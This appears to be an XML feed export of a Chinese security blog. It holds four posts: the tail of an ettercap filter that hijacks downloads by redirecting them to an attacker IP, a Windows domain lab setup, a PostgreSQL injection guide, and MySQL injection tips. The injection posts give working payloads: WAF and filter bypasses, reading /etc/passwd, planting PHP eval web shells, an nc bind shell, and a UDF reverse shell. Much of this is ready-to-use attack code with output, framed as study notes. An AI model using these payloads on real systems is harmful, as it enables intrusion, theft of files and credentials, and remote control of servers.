Response!\n&quot;); if (search(DATA.data, &quot;Location:&quot;))&#123; replace(&quot;Location:&quot;, &quot;Location: http://YOUR_PROGRAM_URL#&quot;); msg(&quot;Replace 302 Successfully!\n&quot;); &#125; &#125; ## Replace 200 Response if (search(DATA.data, &quot;200 OK&quot;))&#123; msg(&quot;Found 200 Response!\n&quot;); if (search(DATA.data, &quot;Content-Type: application&quot;))&#123; replace(&quot;200 OK&quot;, &quot;302 Moved Temporarily \r\nLocation: http://120.79.2.221#&quot;); msg(&quot;Replace 200 Successfully!\n&quot;); &#125; &#125;&#125; 规则编译： 开始攻击： 随意点击一个下载链接 攻击机这边显示劫持成功，但是目标机那边抓包却显示没有被劫持成功，估计是网站有劫持防护或者目标机防火墙原因 总结学习了中间人用在劫持下载上的场景，也了解了直接下载和间接下载的不同 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>中间人攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磨皮皮之域环境搭建基础]]></title>
    <url>%2F2018%2F03%2F27%2F%E7%A3%A8%E7%9A%AE%E7%9A%AE%E4%B9%8B%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[配置windows 2008配置固定IP更改计算机名 配置固定ip 1开始-&gt;控制面板-&gt;网络和internet-&gt;网络连接-&gt;本地连接右键属性 选择internet 协议版本 4(TCP/IPv4)，属性 配置DNS服务器先进入服务器管理器 1开始-&gt;管理工具-&gt;服务器管理器 然后添加角色 下一步 选择DNS服务器 下一步，下一步，点击安装，安装完成后点击关闭 配置active directory域服务进入安装页面 1开始-&gt;运行-&gt;dcpromo-&gt;回车 下一步 下一步 选择在新林中创建域，下一步 填入域名，我这里填的contoso.com，下一步 因为主域控就是2008，所以选择Windows server 2008 r2，下一步 下一步 检查DNS配置过程中会弹出如图所示框 点击是 选择域数据存放地址，默认的就行，下一步 输入管理员密码，下一步 下一步 接着系统开始配置active directory域服务，等待一段时间 点击完成，接着服务器重启 重启后可以看到服务以及配置完成 配置win xp和win 2003配置和2008类似，但需要注意的是 设置固定ip时，需要在下面的DNS服务器那里输入域控2008的ip 改名窗口那里的隶属于选项选择域，并且输入2008服务器上的域名称，然后输入域控的账号密码 现在域环境就配置好了 那个krbtgt用户是主域控生成的账号，是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证 路还很长]]></content>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PostgreSQL从入门到放弃]]></title>
    <url>%2F2018%2F03%2F26%2FPostgreSQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%2F</url>
    <content type="text"><![CDATA[msf就是用的postgrespl，在mac上安装msf的时候顺带安装了了这个数据库 基础操作启动服务： 1service postgresql start 切换用户： 1su postgres 进入数据库： 1psql postgres 修改密码： 1alter user postgres with password &apos;xxx&apos;; 使用修改后的密码登录数据库： 1psql -h 127.0.0.1 -U postgres -W 切换数据库： 1\c 库名 列库： 1\l 列表： 1\dt 列表结构： 1\d 表名 列用户： 1\du 列系统目录列表： 1select pg_ls_dir(&apos;./&apos;); 读文件： 只能读取当前目录下的文件，不能垮目录，并且只能使用相对路径 1select pg_read_file(&apos;&apos;) 但是可以通过建立临时表的方法来读取垮目录敏感文件 1234create table tmp(t text);copy tmp from &apos;/etc/passwd&apos;;select * from tmp limit 1 offset 0;drop table tmp; 写文件： 12345creat table tmp(t text);insert into tmp(t) values (&apos;&lt;?php @eval(&quot;$_post[cmd]&quot;);?&gt;&apos;);select * from tmp;copy tmp(t) to &apos;/root/1.php&apos;;drop table tmp; 小小补充： 12progresql不区分大小写如果一行语句中有多个执行语句，则只会返回最后一个，例如select 1;select;结果返回2 unknown类型： postgres输入的所有字符串都被认为是unknown类型，即输入本身未定义类型，由数据库根据操作进行匹配转换，匹配失败则报错。 unknown有两种输入模式：单引号转义模式和美元符逃逸模式。 在单引号转义模式中允许使用前缀E/U&amp;和B/X表示转义字符串和unicode字符串和位串，其中E表示进行c语言风格的转换，U表示进行unicode转义，并支持自定义转义符，B和X会把后面跟随的字符转换为二进制数 以下查询结果都将返回制表符 123456select E&apos;\t&apos;;select E&apos;\012&apos;;select E&apos;\x09&apos;;select E&apos;\u0009&apos;;select U&amp;&apos;\0009&apos;;select U&amp;&apos;!0009&apos; usecape &apos;!&apos;; 在美元逃逸模式中任何字符都不会被转移而被直接输出，以下会直接输出单引号 1select $&apos;$; 数据类型转换： postgresql支持两种数据类型转换方式，cast语句或者::运算符 12select cast(&apos;1&apos; as int);select &apos;1&apos;::text::int; 通过目录对象获取关键信息数据库名称存放于pg_database目录对象的datname字段中，所有用户都可以读取这个目录对象 1select datname from pg_database; 数据库配置信息存放于pg_setting目录对象中，name字段为设置选项的名称，setting字段为选项的值。配置信息中包含有数据库文件目录（data_directory）和数据库认证配置文件路径（hba_file），只有super用户权限才能读取 1select name,setting from pg_settings where name in (&apos;hba_file&apos;,&apos;data_directory&apos;); 数据库的用户信息存放于pg_authid目录对象中，只有super用户权限才能读取(读取到的密码是‘md5’+md5(密码)） 1select rolname,rolpassword from pg_authid; 判断当前用户是否具有super权限(因为pg_user视图里的usesuper字段是一个布尔值) 1select usesuper from pg_user where usename=current_user; 在注入利用中，最关心的三点是：所有schema、所有表和其所属的schema、所有字段和其所附属的表 查询完整的schema信息： 1select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 1; 查询所有的用户表（所有表信息存放于tables目录对象的table_name字段中） 1select table_name from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 1; 查询所输入manager.admin的所有字段（所有字段信息存放于dolumns目录对象的column_name字段中，同时由table_name字段记录对应的表名） 1select column_name from information_schema.columns where table_schema=&apos;manager&apos; and table_name=&apos;admin&apos;; 绕过技巧利用多行执行忽略数据类型敏感限制在postgres中多行执行只能获取最后一行的结果，可以用来绕过数据类型敏感限制 例如在测试环境中 1content.php?id=1 union select 1,2,3,4 返回了数据类型错误 但是可以用以下语句进行绕过 1content.php?id=1;select 1,2,3,4 当然了，这个绕过方法的前提是服务器端脚本处理结果集中每一行时使用的是数字索引不是字符串索引，因为后面的多行查询部分没有指定别名。否则会报错 利用美元符号绕过GPC和pg_escape_string美元符号可以在任何地方代替单引号，GPC（与addslashes作用相同）不会对美元符号进行转义 例如，在测试环境中 1content3.php?id=1 union select 1,2,3,4-- 会返回数据类型错误 可以用美元符号绕过 1content3.php?id=1 union select 1,$$2$$,$$3$$,$$4$$-- pg_escape_string和GPC类似 利用特性绕过WAFpostgres会将双引号中的内容认为是一个表名或者字段名，同时在双引号扩起来的字符串中使用U&amp;前缀进行转义是合法的，可以用来绕过关键字过滤 例如如下查询语句 1select U&amp;&quot;tabl\0065_sch\0065ma&quot; from U&amp;&quot;inform\0061tion_sch\0065ma&quot;.U&amp;&quot;t\0061bles&quot; where U&amp;&quot;tabl\0065_sch\0065ma&quot; not in (U&amp;&apos;pg_cat\0061log&apos;,U&amp;&apos;inform\0061tion_sch\0065ma&apos;) group by 1; 与以下语句是等价的 1select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1; 都可以查询到所有的schema 常用绕过空格字符： 制表符：\t，0x09换行符：\n，0x0a分页符：0x0c回车符：\r，0x0d 利用join绕过逗号过滤1Content.php?id=2 union select * from ((((select 1)a join (select &apos;2&apos;::varchar)b on 1=1) join (select array(select table_schema::text from information_schema.tables group by 1)::text x)c on 1=1) join (select &apos;4&apos;::varchar)d on 1=1)-- 查询结果会返回所有schema名称 文件操作copycopy可以用来读取文件，常规流程是建立一个临时表，将要读取的文件导入表内，然后删除表 但是copy命令有很多缺陷： 分隔符缺陷：postgres默认以制表符（\t,0x09）为两个字段的分隔符，同时以换行符为每一行的分隔符。如果要导入的文件中含有制表符，那么制表符到下一个制表符之间的内容都会被认为是另一个字段，如果目标表只有一个字堵啊，就会报错 但是copy命令提供了delimiter选项来自定义分隔符 1copy test(t) from &apos;c:/test&apos; with delimiter E&apos;\x7f&apos;; \.缺陷：遇到\.时会终止copy并报错，因为\.是copy from stdin模式下的结束标识。例如当copy apache的配置文件时，其含有 1&lt;FileMatch &quot;^\.ht&quot;&gt; 编码缺陷：copy命令只能导入与服务器编码相同的文件 除了以上缺陷，copy命令还有一个缺点，就是不能导出二进制文件 利用场景场景一：union-select型注入union-select型注入的特点是数据库通过执行union select语句返回的结果集中有一行或多行会被web应用程序处理并返回结果。 当输入 121 and 1=11 and 1=2 时，1=2报错，存在sql注入，确定字段数及回显位置 121 and 1=1 order by 4--1 and 1=1 union select 1,2,3,4-- 在这里报错了，因为postgres在进行union select操作时对数据类型敏感 改为 11 and 1=1 union select &apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;-- 即可看到回显位置 获取schema总数和第一个schema名称，更改offset的值可以查询其他schema名称 1231 and 1=1 union select 1,&apos;2&apos;,count(*)::text,&apos;4&apos;from(select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)x--1 and 1=1 union select 1,&apos;2&apos;,table_schema,&apos;4&apos; from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 3 limit 1 offset 0-- 场景二：union-image型注入union-image型注入是一种特殊的union-select注入，因为数据库中存储的字段不是一般的数值或字符串，而是bytea型数据，类似于mssql中的image类型。 由于服务器脚本在处理返回字段时会将此字段表达的字节直接输入到response流中，，只有这样用户才能从浏览器中看到完整的图片，所以判断关键字进行注入的工具不能使用，只能手工 服务器可能会返回image/jpeg头，在浏览器中进行测试可能注入成功，也可能返回一个错误图片。 实验只能在bp中进行， 因为不会在浏览器中显示 值得注意的是，这次在bp里进行的union select 1,’2’,’3’—并不能回显 但是当输入 11%20and%201=2%20union%20select%201,&apos;2&apos;,&apos;%df&apos;-- 回显报错： 因为bytea可以看作是字节数组，由于postgres允许将varchar/text类型转换为bytea，同时也能自动转换unknown类型。执行这两种转换时，会将字符串代表的内容转换为对应的utf-8值 所以根据上面的用法，可以利用以下语句来查询schema名称 11 union select 1,&apos;&apos;,table_schema::text::bytea from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 3-- 场景三：union-list型注入union-list型注入点所在脚本文件会遍历查询所有的结果集的每一行，并将其处理后输出在页面 当构造语句： 1?type=article&apos; union select 1,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;-- web输出页面多了一项3，且位置在第一个，其链接也指向1，所以1和3为回显位置 此时构造语句： 1type=article&apos; and 1=2 union select 1,&apos;&apos;,table_schema,&apos;&apos; from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 3-- 即可读取所有schema 场景四：union-download型注入一般网站都有个上传文件的文件夹，为了防止上传攻击，一般都在网站根目录的上级目录，同时在数据库中保存文件的路径。用户下载这个文件夹时服务器脚本根据传递的id获取文件路径，读取文件并直接输出到response流。 构造语句： 1?id=1 and 1=2 union select 1,&apos;2&apos;,&apos;3&apos;-- 回显为 可以看到直接将2与文件路径拼接了。那么将2改为某个文件呢，构造 1?id=1 and 1=2 union select 1,&apos;/download.php&apos;,&apos;3&apos;-- 成功下载download.php文件 场景五：基于报错的注入在update.php中，在rename输入框中输入单引号报错，并且输出了sql语句 可以看到，是update语句，这个语句没有回显，所以只能利用基于报错的思想来进行注入 构造语句： 11&apos;where id=1;select (&apos;!&apos;||count(*)::text)::int from(select table_schema from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)xx-- 报错信息： 说明schema有两个（感叹号的作用是防止由于count(*)转换为text值之后仍旧代表有效数字 的字符串时转换成功而不返回错误信息，不一定要感叹号，非数字前缀都可以） 构造语句: 11&apos;where id=1;select (&apos;!&apos;||table_schema::text)::int from(select table_schema from information_schema.tables where table_schema not in(&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1)x limit 1 offset 0-- 报错信息成功爆出第一个schema 每次查询都相当于一次事物操作，出错就会回滚，例如在大对象导入时 1select (&apos;!&apos;||(lo_import(&apos;/etc/passwd&apos;)::text))::int; 会报错，并且导入失败，此时可以利用临时表进行两次注入 12create table tmp(oid int);insert into tmp values(lo_import(&apos;/etc/passwd&apos;));-- 1select (&apos;!&apos;||(id::text))::int from tmp; 场景六：基于时间的盲注postgres中的延时语句是： 1pg_sleep(); 例如以下语句会创建一个test表，同时如果创建成功，则会延时两秒 1;create table test;select pg_sleep(2) where (select table_name from information_schema.tables where table_schema=current_schema() and table_name=&apos;test&apos;) is not null-- 第一个分号后面的语句可以换成任何合法的sql语句，不过需要对后面的语句作出相应调整 同时，如果需要多行执行的语句本身就是一个select语句的话，则去掉创建表的语句，并将 select语句替换为相应语句 进阶利用nc反弹get shell在靶机上登录postgresql，然后新建表写入 1234create table test(t text);insert into test(t) values (&apos;nc -lvvp 2345 -e /bin/bash&apos;);select * from test;copy test(t) to &apos;/root/test&apos;; 直接运行会提示没有权限，需要给予权限，然后运行 12chmod +x test./test 此时在攻击机上进行监听，即可拿到可爱的shell 12nc -vn 10.211.55.7 2345python -c "import pty;pty.spawn('/bin/bash')" 利用UDF函数反弹shell 首先查看是否为super权限 1select usesuper::text::int from pg_user where usename=current_user; 确定为super权限后，执行以下语句来返回一个oid 1select 1,2,lo_creat(-1); 如果不是super权限，就创建临时表保存返回的oid 12create table tmp(id oid);insert into temp values(lo_creat(-1)); 接着通过强制类型转换或者盲注获取结果（如果是super权限可以省略这一步） 12select (&apos;&apos;|(id::text))::int from tmp-- //强制类型转换报错select pg_sleep(5) where (select id from tmp)&gt;0-- //基于时间的盲注 查看数据库版本，以便选择正确的UDF 1select version(); 根据oid打开之前的大对象，并向其中写入内容(hexcode为udf经过16进制编码后得到的，) 12select lo_open(16474,x&apos;60000&apos;::int);select lo_write(0,decode(&apos;hexcode&apos;,&apos;hex&apos;)); 建议每次从udf函数中截取512自己并转换为hex值，继续想大对象中追加数据，知道udf完全导入 123select lo_open(oid,x&apos;60000&apos;::int);select lo_lseek(0,0,2);select lo_write(0,decode(&apos;xxxx,&apos;hex&apos;)); 将文件导出 1select lo_export(oid,&apos;1.dll&apos;); 删除大对象 1select lo_unlink(oid); 注册udf函数 1create or replace function test(text,int) returns int as &apos;1.dll&apos;;&apos;GetResvShell&apos; language c; 获取反弹shell 1select test(&apos;127.0.0.1&apos;,1234);]]></content>
      <tags>
        <tag>postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入被我忽略的一点tips]]></title>
    <url>%2F2018%2F03%2F13%2FSQL%E6%B3%A8%E5%85%A5%E8%A2%AB%E6%88%91%E9%81%97%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9Btips%2F</url>
    <content type="text"><![CDATA[之前刘师傅在群里发了个gayhub项目地址，里面有很多学习干货，很基础的东西，我感觉自己基础不行，就打打基础吧。里面看到了一篇SQL注入的技巧总结不错，再总结的基础上总结一下 常用注入关键字常量：true、false、null、current_timestamp 1234567mysql&gt; select current_timestamp;+---------------------+| current_timestamp |+---------------------+| 2018-03-12 23:41:24 |+---------------------+1 row in set (0.00 sec) 变量：@myvar:=2(这个语句相当于给myvar变量赋值) 12345678910111213141516171819202122232425262728293031mysql&gt; select @myvar:=2;+-----------+| @myvar:=2 |+-----------+| 2 |+-----------+1 row in set (0.00 sec)mysql&gt; select @myvar=2;+----------+| @myvar=2 |+----------+| 1 |+----------+1 row in set (0.00 sec)mysql&gt; select @myvar=1;+----------+| @myvar=1 |+----------+| 0 |+----------+1 row in set (0.00 sec)mysql&gt; select @myvar;+--------+| @myvar |+--------+| 2 |+--------+1 row in set (0.00 sec) 系统变量：@@version、@@datadir 123456789101112131415mysql&gt; mysql&gt; select @@version;+-----------+| @@version |+-----------+| 5.7.21 |+-----------+1 row in set (0.00 sec)mysql&gt; select @@datadir;+-------------------------------------------------+| @@datadir |+-------------------------------------------------+| /usr/local/mysql-5.7.21-macos10.13-x86_64/data/ |+-------------------------------------------------+1 row in set (0.00 sec) 常用函数：version()、pi()、pow()、char()、substring() 1234567891011121314151617181920212223mysql&gt; select pow(2,3);+----------+| pow(2,3) |+----------+| 8 |+----------+1 row in set (0.00 sec)mysql&gt; select char(72);+----------+| char(72) |+----------+| H |+----------+1 row in set (0.00 sec)mysql&gt; select substring(&apos;qwerty&apos;,3,3);+-------------------------+| substring(&apos;qwerty&apos;,3,3) |+-------------------------+| ert |+-------------------------+1 row in set (0.00 sec) 字符串生成：hex(x)、conv(x,y,z)（分别为转换成16进制和x从y进制转换为z进制）、seil()、floor() 12345678910111213141516171819202122232425262728293031mysql&gt; select hex(72);+---------+| hex(72) |+---------+| 48 |+---------+1 row in set (0.00 sec)mysql&gt; select conv(5,16,2);+--------------+| conv(5,16,2) |+--------------+| 101 |+--------------+1 row in set (0.00 sec)mysql&gt; select ceil(3.14);+------------+| ceil(3.14) |+------------+| 4 |+------------+1 row in set (0.00 sec)mysql&gt; select floor(3.14);+-------------+| floor(3.14) |+-------------+| 3 |+-------------+1 row in set (0.00 sec) 常用绕过字符过滤空格：%20, %09, %0a, %0b, %0c, %0d, %a0,(),/*/and，or：||，&amp;&amp;等号：可以用between and或者like绕过 union select：​ 括号：’and(true)like(false)union(select(pass)from(users))，​ 方括号：union [all|distinct] select pass from users#，​ 空格：union%a0select pass from users，​ 或者内联注释：union/&amp;sort=/select pass from users#union：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))having：and(select substr(group_concat(pass),1,1)from users)=’aselect … from(过滤代码如/SELECTs+[A-Za-z.]+s+FROM/i/i)：​ select [all|distinct] pass from users​ select`table_name`from`information_schema` . `tables`​ select pass as alias from users​ select pass aliasalias from users​ select pass`alias alias`from users​ select+pass%a0from(users)select,and,&amp;： 可以利用前面的基于false的注入方法逗号：‘ and substr(data from 1 for 1)=’a’#字符串连接函数：​ select ‘a’’b’’c’’d’;​ select concat(‘a’,’b’,’c’,’d’); //需要注意的是如果连接的字符串中有null，那么返回结果就为null​ select concat_ws(‘’,’a’,’b’,’c’,’d’); //前面必须要有一个空字符，否则输出的字符串不是预期​ select group_concat(‘a’,’b’,’c’,’d’); http参数污染：当容器框架为apache/PHP时，同时注入两个参数（例如id=1&amp;id=union select。。。。），服务器waf的网络层会解析id=1，而PHP应用层会解析后面的查询语句。类似的还有 12345id=1&amp;id=2&amp;id=3asp.net+iis:id=1,2,3asp+iis:id=1,2,3php+apache:id=3jsp+tomcat:id=1 下图是绕过关键字过滤的例子： 注入技巧limit注入在limit注入中，limit后面跟两个函数procedure和into，但into要有写权限才能利用 之前班上小组出题中，刘师傅出过一道limit注入的题，当时构造的语句是： 1id=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) 但是当时的题目不支持报错注入，用的基于时间的注入 1id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) = 5, BENCHMARK(5000000,SHA1(1)),1))))),1) 值得注意的是，当利用limit的时间注入时，sleep函数是不行的，只能用benchmark函数来延时 此外，limit参数还可以用于确定字段数 1234mysql&gt; select * from db limit 1 into @;ERROR 1222 (21000): The used SELECT statements have a different number of columnsmysql&gt; select * from db limit 1 into @,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@,@;ERROR 3061 (42000): User variable name &apos;&apos; is illegal 说明这个列的字段数为22 此外可以判断已知表名的字段数： 12mysql&gt; select Db from db where Db=1 and (select * from db)=1;ERROR 1241 (21000): Operand should contain 22 column(s) 说明此字段数为22 order by注入order by注入中值得注意的几点： order by 3-1和order by 2是不一样的 12order by if(1=1,name,price) //通过name字段排序order by if(1=1,name,price) //通过price字段排序 12order by(case when (1=1) then name else price end) //通过name字段排序order by(case when (1=2) then name else price end) //通过price字段排序 12order by ifnull(null,price) //通过price字段排序order by ifnull(null,name) //通过name字段排序 基于报错的注入： 返回多条记录 123456789101112131415161718192021222324mysql&gt; select Db,User from db order by if(1=1,1,(select 1 union select 2));+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set (0.00 sec)mysql&gt; select Db,User from db order by if(1=2,1,(select 1 union select 2));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select Db,User from db order by if(1=1,1,(select 1 from information_schema.tables));+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set (0.00 sec)mysql&gt; select Db,User from db order by if(1=2,1,(select 1 from information_schema.tables));ERROR 1242 (21000): Subquery returns more than 1 row ​ regexp函数 123456789101112mysql&gt; select Db,User from db order by(select 1 regexp if(1=1,1,0x00));+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set (0.00 sec)mysql&gt; select Db,User from db order by(select 1 regexp if(1=2,1,0x00));ERROR 1139 (42000): Got error &apos;empty (sub)expression&apos; from regexp ​ updatexml 之前班上小组出题也遇到过updatexml注入的问题 12345678910111213141516171819UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值然后咱们再看看语句：http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)CONCAT(str1,str2,…) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。错误大概会是：ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ 123456789101112mysql&gt; select Db,User from db order by updatexml(1,if(1=1,1,user()),1);+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set (0.00 sec)mysql&gt; select Db,User from db order by updatexml(1,if(1=2,1,user()),1);ERROR 1105 (HY000): XPATH syntax error: &apos;@localhost&apos; ​ extractvalue 123456789101112mysql&gt; select Db,User from db order by extractvalue(rand(),if(1=1,1,user()));+--------------------+---------------+| Db | User |+--------------------+---------------+| test | 2test || performance_schema | mysql.session || sys | mysql.sys |+--------------------+---------------+3 rows in set (0.00 sec)mysql&gt; select Db,User from db order by extractvalue(rand(),if(1=2,1,user()));ERROR 1105 (HY000): XPATH syntax error: &apos;@localhost&apos; 基于时间的注入 12mysql&gt; select Db,User from db order by if(1=0,1,sleep(2)); //延迟两秒执行mysql&gt; select Db,User from db order by if(1=1,1,sleep(2)); //立即执行 ​ group by mysql for mac利用group by时会报错，因为默认开启了only_full_group_by SQL模式: 1234567mysql&gt; select @@session.sql_mode;+-------------------------------------------------------------------------------------------------------------------------------------------+| @@session.sql_mode |+-------------------------------------------------------------------------------------------------------------------------------------------+| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+-------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 利用如下语句就可更改： 12345mysql&gt; set global sql_mode=&apos;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; set session sql_mode=&apos;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;Query OK, 0 rows affected (0.00 sec) 验证： 12345678910mysql&gt; select * from test group by pwd with rollup;+----+--------+-----------+---------------+| id | user | pwd | mail |+----+--------+-----------+---------------+| 1 | admin | admin123 | admin@qq.com || 2 | guest | guest123 | guest@qq.com || 3 | hacker | hacker123 | hacker@qq.com || 3 | hacker | NULL | hacker@qq.com |+----+--------+-----------+---------------+4 rows in set (0.00 sec) 上面的验证例子可以看到，利用group by with rollup统计方法进入查询时会产生一个null的行，在利用的时候可以用limit或offset将null取出来然后传入空的查询字段，查询语句变成null=null，绕过验证 不常用函数绕过过滤一般CTF或者实战中会过滤一些常用SQL查询函数，所以我们可以用一些不常用的函数来绕过过滤 lpad(data,1,space(1)) //rpad()同理 1234567mysql&gt; select lpad(user(),15,space(1));+--------------------------+| lpad(user(),15,space(1)) |+--------------------------+| root@localhost |+--------------------------+1 row in set (0.00 sec) left(data,1) 1234567mysql&gt; select left(user(),15);+-----------------+| left(user(),15) |+-----------------+| root@localhost |+-----------------+1 row in set (0.00 sec) reverse(right(reverse(data),1)) 1234567mysql&gt; select reverse(right(reverse(user()),15));+------------------------------------+| reverse(right(reverse(user()),15)) |+------------------------------------+| root@localhost |+------------------------------------+1 row in set (0.00 sec) insert(insert(data,0,0,space(0)),0,0,0) 1234567mysql&gt; select insert(insert(user(),0,0,space(0)),0,0,0);+-------------------------------------------+| insert(insert(user(),0,0,space(0)),0,0,0) |+-------------------------------------------+| root@localhost |+-------------------------------------------+1 row in set (0.00 sec) length(trim(leading ‘a’ from data)) 1234567mysql&gt; select length(trim(leading &apos;a&apos; from user()));+---------------------------------------+| length(trim(leading &apos;a&apos; from user())) |+---------------------------------------+| 14 |+---------------------------------------+1 row in set (0.00 sec) length(replace(data,’a’,’’)) 123456789101112131415mysql&gt; select length(replace(user(),&apos;a&apos;,&apos;&apos;));+--------------------------------+| length(replace(user(),&apos;a&apos;,&apos;&apos;)) |+--------------------------------+| 13 |+--------------------------------+1 row in set (0.00 sec)mysql&gt; select length(replace(user(),&apos;o&apos;,&apos;&apos;));+--------------------------------+| length(replace(user(),&apos;o&apos;,&apos;&apos;)) |+--------------------------------+| 10 |+--------------------------------+1 row in set (0.00 sec) locate(‘a’,data) 12345678910111213141516171819202122mysql&gt; select locate(&apos;r&apos;,user());+--------------------+| locate(&apos;r&apos;,user()) |+--------------------+| 1 |+--------------------+1 row in set (0.00 sec)mysql&gt; select locate(&apos;o&apos;,user());+--------------------+| locate(&apos;o&apos;,user()) |+--------------------+| 2 |+--------------------+1 row in set (0.00 sec)mysql&gt; select locate(&apos;host&apos;,user());+-----------------------+| locate(&apos;host&apos;,user()) |+-----------------------+| 11 |+-----------------------+1 row in set (0.00 sec) instr(data,’a’) 1234567mysql&gt; select instr(user(),&apos;o&apos;);+-------------------+| instr(user(),&apos;o&apos;) |+-------------------+| 2 |+-------------------+1 row in set (0.00 sec) position(‘a’ in data); 1234567mysql&gt; select position(&apos;o&apos; in user());+-------------------------+| position(&apos;o&apos; in user()) |+-------------------------+| 2 |+-------------------------+1 row in set (0.00 sec) 不用关键字进行查询来绕过过滤： 爆字段： 在不知道字段的时候可以参考如下方法进行注入： 12345678mysql&gt; select * from test where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from test)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;+---------------+-------+----------+--------------+| id | user | pwd | mail |+---------------+-------+----------+--------------+| 1 | admin | admin123 | admin@qq.com || hacker@qq.com | 1 | 1 | 1 |+---------------+-------+----------+--------------+2 rows in set (0.01 sec) 当union被过滤时，可以用如下方法爆第一个字段名(原理是在使用别名的时候不能出现相同的字段名，利用join把表扩充，查询到重复字段成功通过报错信息爆出第一个字段名)： 12mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b) as c); ERROR 1060 (42S21): Duplicate column name &apos;id&apos; 利用using关键字爆第二个字段： 12mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b using(id))as c);ERROR 1060 (42S21): Duplicate column name &apos;user&apos; 同理爆第三个字段的方法为： 12mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b using(id,user))as c);ERROR 1060 (42S21): Duplicate column name &apos;pwd&apos; 爆表 爆表利用的是polygon函数，polygon函数传入的参数如果不是存在的字段名的话就会报错，但如果传入的是一个存在的字段名就会报出已知库表列 1234mysql&gt; select * from test where id=1 and polygon(1);ERROR 1367 (22007): Illegal non geometric &apos;1&apos; value found during parsingmysql&gt; select * from test where id=1 and polygon(id);ERROR 1367 (22007): Illegal non geometric &apos;`mysql`.`test`.`id`&apos; value found during parsing 爆库 当限制了payload长度时，可以利用如下方法进行爆库名(原理是如果使用的自定义函数不存在，就会爆出这个库和表不存在此函数) 12mysql&gt; select * from test where id=1 and polygon(id);ERROR 1367 (22007): Illegal non geometric &apos;`mysql`.`test`.`id`&apos; value found during parsing 文件操作文件操作权限mysql中的secure_file_priv全局系统变量用于限制数据的导入导出操作，当这个变量值为空时就能使用函数，5.5.53版本后的值默认为null就不能使用 123456789101112131415mysql&gt; select @@version;+-----------+| @@version |+-----------+| 5.7.21 |+-----------+1 row in set (0.00 sec)mysql&gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | NULL |+------------------+-------+1 row in set (0.00 sec) 读文件：load_file() 1select load_file(&apos;/etc/passwd&apos;); load_file的默认目录为@@datadir 读文件有最大限制@@max_allowed_packet可以查看文件读取最大值，这个值依版本不同而不同 写文件：into outfile()/dumpfile() 1select &apos;&lt;?php @eval($_post[&apos;c&apos;]);?&gt;&apos; into outfile &apos;www/muma.php&apos;; 